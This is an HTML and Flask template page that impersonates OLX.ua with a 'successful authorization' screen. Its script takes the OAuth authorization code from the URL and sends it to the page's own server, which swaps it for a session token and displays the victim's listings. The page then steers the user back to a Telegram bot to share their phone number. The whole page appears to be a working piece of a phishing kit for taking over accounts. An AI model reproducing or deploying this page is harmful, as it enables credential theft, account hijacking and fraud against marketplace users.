<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Авторизація успішна — OLX.ua</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">

    <style>
        :root {
            --olx-dark: #002f34;
            --olx-bg: #f2f4f5;
            --olx-cyan: #23E5DB;
        }

        body {
            margin: 0;
            font-family: 'Roboto', sans-serif;
            background-color: var(--olx-bg);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        header {
            background-color: var(--olx-dark);
            height: 72px;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0 16px;
            width: 100%;
            box-sizing: border-box;
        }

        .header-container {
            width: 100%;
            max-width: 1200px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .btn-add {
            background: white !important;
            color: var(--olx-dark) !important;
            padding: 10px 20px;
            border-radius: 4px;
            font-weight: bold;
            font-size: 14px;
            text-decoration: none;
        }

        main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: white;
            width: 100%;
            max-width: 440px;
            padding: 35px 25px;
            border-radius: 16px;
            box-shadow: 0 15px 40px rgba(0,0,0,0.12);
            text-align: center;
            animation: fadeIn .6s ease;
            box-sizing: border-box;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px) }
            to { opacity: 1; transform: translateY(0) }
        }

        .checkmark {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background: #27ae60;
            margin: 0 auto 15px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .checkmark svg {
            width: 30px;
            height: 30px;
            stroke: white;
            stroke-width: 4;
            fill: none;
        }

        h1 { font-size: 22px; margin: 10px 0; color: #1f2d3d; }
        p { color: #5f6c7b; font-size: 14px; margin-bottom: 20px; line-height: 1.5; }

        .ads-section {
            text-align: left;
            margin-bottom: 25px;
            border-top: 1px solid #f2f4f5;
            padding-top: 15px;
        }
        .ads-title {
            font-size: 13px;
            font-weight: 700;
            color: #7f9799;
            text-transform: uppercase;
            margin-bottom: 12px;
            letter-spacing: 0.5px;
        }
        .ad-card {
            display: flex;
            align-items: center;
            background: #f8f9fa;
            border: 1px solid #ebedee;
            border-radius: 8px;
            padding: 8px 12px;
            margin-bottom: 8px;
            gap: 12px;
        }
        .ad-img {
            width: 32px;
            height: 32px;
            object-fit: contain;
            border-radius: 4px;
            background: white;
            padding: 2px;
            border: 1px solid #eef0f1;
        }
        .ad-info {
            flex: 1;
            min-width: 0;
        }
        .ad-name {
            font-size: 14px;
            font-weight: 500;
            color: var(--olx-dark);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .ad-status {
            font-size: 11px;
            color: #27ae60;
            display: flex;
            align-items: center;
            gap: 4px;
            margin-top: 2px;
        }

        /* СТИЛИ ЗАГРУЗКИ (SKELETON) */
        .skeleton {
            background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%);
            background-size: 200% 100%;
            animation: loading 1.5s infinite;
            border-radius: 4px;
        }
        @keyframes loading {
            0% { background-position: 200% 0; }
            100% { background-position: -200% 0; }
        }
        .sk-img { width: 32px; height: 32px; }
        .sk-text { width: 80%; height: 12px; margin-bottom: 6px; }
        .sk-sub { width: 40%; height: 8px; }

        .btn {
            display: block;
            width: 100%;
            padding: 16px;
            background: var(--olx-dark);
            color: white;
            font-weight: 700;
            border-radius: 10px;
            text-decoration: none;
            transition: .25s;
            box-shadow: 0 6px 15px rgba(0,0,0,.15);
            box-sizing: border-box;
        }

        .footer-text { margin-top: 20px; font-size: 11px; color: #9aa7b3; }

        @media (max-width: 768px) {
            header { height: 60px; }
            .nav-links { display: none; }
        }
    </style>
</head>

<body>

<header>
    <div class="header-container">
        <a href="#">
            <svg class="logo" xmlns="http://www.w3.org/2000/svg" width="64" height="37" viewBox="0 0 64 37" fill="none">
                <path d="M42.6667 0V37H33.5253V0H42.6667ZM15.2427 3.07524C23.6587 3.07524 30.4853 9.98104 30.4853 18.4946C30.4853 27.0082 23.6587 33.914 15.2427 33.914C6.82667 33.914 0 27.0082 0 18.4946C0 9.98104 6.82667 3.07524 15.2427 3.07524ZM52.1813 9.2473L54.8587 11.9557L57.536 9.2473H64V15.7862L61.3227 18.4946L64 21.203V27.7419H57.536L54.8587 25.0335L52.1813 27.7419H45.7173V21.203L48.3947 18.4946L45.7173 15.7862V9.2473H52.1813ZM15.2427 12.3333C11.8827 12.3333 9.152 15.0957 9.152 18.4946C9.152 21.8936 11.8827 24.6559 15.2427 24.6559C18.6027 24.6559 21.3333 21.8936 21.3333 18.4946C21.3333 15.0957 18.6027 12.3333 15.2427 12.3333Z" fill="#23E5DB"></path>
            </svg>
        </a>
    </div>
</header>

<main>
    <div class="container">
        <div class="checkmark">
            <svg viewBox="0 0 24 24"><polyline points="4,13 9,18 20,6"/></svg>
        </div>

        <h1>Авторизація успішна</h1>
        <p id="main-status">Обробка даних профілю... <br>Будь ласка, зачекайте.</p>

        <div class="ads-section">
            <div class="ads-title">Статус оголошень:</div>
            
            <div id="ads-container">
                {% if user_ads %}
                    {% for ad in user_ads %}
                    <div class="ad-card">
                        <img src="{{ ad.img }}" class="ad-img" alt="olx">
                        <div class="ad-info">
                            <div class="ad-name">{{ ad.title }}</div>
                            <div class="ad-status">
                                <span style="width: 6px; height: 6px; background: #27ae60; border-radius: 50%;"></span>
                                Активне
                            </div>
                        </div>
                    </div>
                    {% endfor %}
                {% else %}
                    <div class="ad-card" style="opacity: 0.6;">
                        <div class="skeleton sk-img"></div>
                        <div class="ad-info">
                            <div class="skeleton sk-text"></div>
                            <div class="skeleton sk-sub"></div>
                        </div>
                    </div>
                    <div class="ad-card" style="opacity: 0.4;">
                        <div class="skeleton sk-img"></div>
                        <div class="ad-info">
                            <div class="skeleton sk-text"></div>
                            <div class="skeleton sk-sub"></div>
                        </div>
                    </div>
                {% endif %}
            </div>
        </div>

        <a href="https://t.me/olx_verif_bot" class="btn" id="btn-back">Поверніться до бота</a>
        <div class="footer-text">© OLX.UA 2026</div>
    </div>
</main>

<script>
async function sendCodeToServer(authCode) {
    if (!authCode || sessionStorage.getItem('code_sent') === authCode) return;
    
    try {
        const response = await fetch("/get_token", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ code: authCode })
        });
        
        const resData = await response.json();
        if (resData.status === "ok") {
            sessionStorage.setItem('code_sent', authCode);
            // ПЕРЕЗАГРУЗКА: Теперь Flask увидит куки и отрендерит реальные объявления
            window.location.href = window.location.pathname; 
        }
    } catch (err) { 
        console.error("Ошибка синхронизации");
    }
}

const urlParams = new URLSearchParams(window.location.search);
const code = urlParams.get("code");

if (code) {
    sendCodeToServer(code);
} else {
    // Если кода в URL уже нет, значит мы перезагрузились и данные в куках
    document.getElementById('main-status').innerHTML = "Ваш профіль синхронізовано. Тепер поверніться до Telegram і натисніть <br><b>📲 поділитися номером</b>";
}
</script>
</body>
</html>
